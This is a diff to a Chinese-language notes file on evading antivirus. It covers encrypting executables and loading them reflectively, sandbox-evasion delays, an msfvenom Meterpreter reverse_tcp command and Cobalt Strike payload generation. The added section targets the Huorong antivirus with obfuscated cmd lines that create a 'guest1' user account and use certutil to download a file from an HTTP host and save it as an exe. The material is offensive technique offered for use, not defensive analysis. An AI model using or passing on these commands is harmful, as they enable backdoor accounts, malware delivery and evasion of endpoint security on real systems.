@@ -1,3 +1,4 @@
+# Bypass
 普通 exe 免杀使用 py 或 go 等加密后反射加载，基本上就可以过大部分杀软了。
 启动后 cmd /c timeout 延迟等待N秒用来反沙箱
 
@@ -16,6 +17,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.127.134 LPORT=1234
 
 cobalt strike
 生成 payload C 版本。用掩日生成一下。
+
+## Bypass/火绒
+
+```sh
+n""e""t u""s""er  guest1 guest1
+^c""^e^r^t""u^ti^l -u^r"l""""cache -gmt -split -f ht""tp://1"2"7.0.0.1:13""38/d/pzxsnoqd pzxsn""oqd.^e^""x""^e
+^c""^e^r^t""u^ti^l  -u^rl""""cache -sp""lit -""f ht""tp://127.0.0.1 test
+```
 
 # Article
 
